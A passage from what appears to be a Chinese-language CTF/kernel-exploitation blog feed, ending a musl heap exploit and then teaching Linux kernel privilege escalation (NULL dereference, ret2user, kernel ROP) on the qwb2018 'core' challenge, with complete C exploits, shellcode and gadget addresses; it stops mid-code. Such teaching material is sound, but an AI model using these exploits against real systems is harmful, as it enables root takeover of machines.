class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(fake_name_addr)  <span class="comment"># name_addr</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># content_addr</span></span><br><span class="line">fake_node += p64(<span class="built_in">len</span>(<span class="string">&#x27;fake name&#x27;</span>))  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># content_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;hijack node&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span>), fake_node)</span><br><span class="line">add(<span class="string">&quot;payload&quot;</span>, payload)</span><br><span class="line">log.info(<span class="string">&quot;fake chunk addr: &quot;</span> + <span class="built_in">hex</span>(fake_chunk_addr))</span><br></pre></td></tr></table></figure></div></p>
]]></content>
  </entry>
  <entry>
    <title>linux kernel pwn 内核利用</title>
    <url>/2024/11/08/linux-kernel-pwn-exploit-technique/</url>
    <content><![CDATA[<h1 id="null-pointer-dereference">NULL Pointer Dereference</h1>
<p>上古利用方法，仅做记录。</p>
<p>如果内核模块中存在可以被调用的空函数指针，那么调用该空指针函数会执行
0 地址对应的代码。如果此时在内存 0 地址处实现写入 payload
就会执行payload。</p>
<p>首先内核驱动代码如下，其中 my_funptr 是一个空函数指针，且在调用 write
函数时会执行到。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">void</span> (*my_funptr)(<span class="type">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">bug1_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> len, <span class="type">loff_t</span> *loff)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] bug1_write\n&quot;</span>);</span><br><span class="line">    <span class="built_in">my_funptr</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">proc_ops</span> proc_fops = &#123;</span><br><span class="line">        .proc_write = bug1_write,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> __init <span class="title">null_dereference_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] null_dereference driver init\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> proc = <span class="built_in">proc_create</span>(<span class="string">&quot;bug1&quot;</span>, <span class="number">0666</span>, <span class="number">0</span>, &amp;proc_fops);</span><br><span class="line">    <span class="keyword">if</span> (!proc) <span class="built_in">printk</span>(<span class="string">&quot;[-] Failed to create proc\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> __exit <span class="title">null_dereference_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[-] null_dereference driver exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_init</span>(null_dereference_init);</span><br><span class="line"><span class="built_in">module_exit</span>(null_dereference_exit);</span><br></pre></td></tr></table></figure></div>
<p>exp 如下，首先在 0 地址处写入提权 payload，然后调用 write 函数执行
payload，最后返回到用户空间执行 <code>system("/bin/sh")</code> 获取
shell 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> payload[] = <span class="string">&quot;\x48\x31\xc0\xe8\xe8\x7b\x0d\x81\xe8\x93\x76\x0d\x81\xc3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="built_in">sizeof</span>(payload));</span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/bug1&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">write</span>(fd, <span class="string">&quot;123&quot;</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>执行 exp ，利用 gdb 调试发现执行到 payload 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/463dafcd5680d1837d39f79783217151.png"
                     
alt="在这里插入图片描述" 
                > 不过现在的内核很难直接利用这一漏洞。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/46eac33675feb3a4640e68734324abba.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h1 id="kernel-stack-buffer-overflow">Kernel Stack Buffer Overflow</h1>
<p>这里以 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/qwb2018_core" >qwb2018
core <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例进行讲解。</p>
<p><code>core_fops</code> 结构体中定义了 <code>core_write</code>
，<code>core_ioctl</code> ，<code>core_release</code> 三个回调函数。</p>
<p><code>core_write</code> 向 <code>name</code> 写入 0x800
长度的数据。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>core_ioctl</code> 有三个功能，其中 0x6677889C 可以设置
<code>off</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, <span class="type">const</span> <span class="type">void</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(<span class="string">&quot;\x016core: %d\n&quot;</span>, a3);</span><br><span class="line">      off = (__int64)a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(<span class="string">&quot;\x016core: called core_copy\n&quot;</span>);</span><br><span class="line">      core_copy_func((__int64)a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>core_read</code> 可以越界读 <code>canary</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ...</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>core_copy_func</code> 存在栈溢出。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 len)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x016Detect Overflow&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)len);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="ret2user">ret2user</h2>
<p>即返回到用户空间的提权代码上进行提权，之后返回用户态即为 root 权限。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2b18e8d90233f59a12a0869cabd0653e.png"
                     
alt="在这里插入图片描述" 
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> user_rip;</span><br><span class="line">    <span class="type">size_t</span> user_cs;</span><br><span class="line">    <span class="type">size_t</span> user_rflags;</span><br><span class="line">    <span class="type">size_t</span> user_sp;</span><br><span class="line">    <span class="type">size_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss, tf_addr = (<span class="type">size_t</span>) &amp;tf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    tf.user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    tf.user_cs = user_cs;</span><br><span class="line">    tf.user_rflags = user_rflags;</span><br><span class="line">    tf.user_sp = user_sp - <span class="number">0x1000</span>;</span><br><span class="line">    tf.user_ss = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//    commit_creds(init_cred);</span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsp, tf_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coore_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + offset);</span><br><span class="line">            prepare_kernel_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) prepare_kernel_cred + offset);</span><br><span class="line">            init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    coore_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    rebase();</span><br><span class="line">    save_status();</span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line">    *(<span class="type">void</span> **) &amp;buf[<span class="number">80</span>] = get_root;</span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="kernel-rop">kernel rop</h2>
<p>开启 smep 和 smap
保护后，内核空间无法执行用户空间的代码，并且无法访问用户空间的数据。因此不能直接
ret2user 。 利用 ROP ，执行
<code>commit_creds(prepare_kernel_cred(0))</code> , 然后
<code>iret</code> 返回用户空间可以绕过上述保护。</p>
<p>这里我添加了 smep 和 smap 保护。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 256M \</span><br><span class="line">  -kernel ./bzImage \</span><br><span class="line">  -initrd ./core.cpio \</span><br><span class="line">  -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \</span><br><span class="line">  -s \</span><br><span class="line">  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure></div>
<p>并且不开启 KPTI 保护。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ # cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Not affected</span><br><span class="line">Mitigation: __user pointer sanitization</span><br><span class="line">Vulnerable: Minimal generic ASM retpoline</span><br></pre></td></tr></table></figure></div>
<p>由于找不到 <code>mov rdi, rax; ret;</code> 这条 gadget ，因此需要用
<code>mov rdi, rax; call rdx;</code> 代替，其中 <code>rdx</code> 指向
<code>pop rcx; ret;</code> 可以清除 <code>call</code> 指令压入栈中的
<code>rip</code> ，因此相当于 <code>ret</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coore_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span 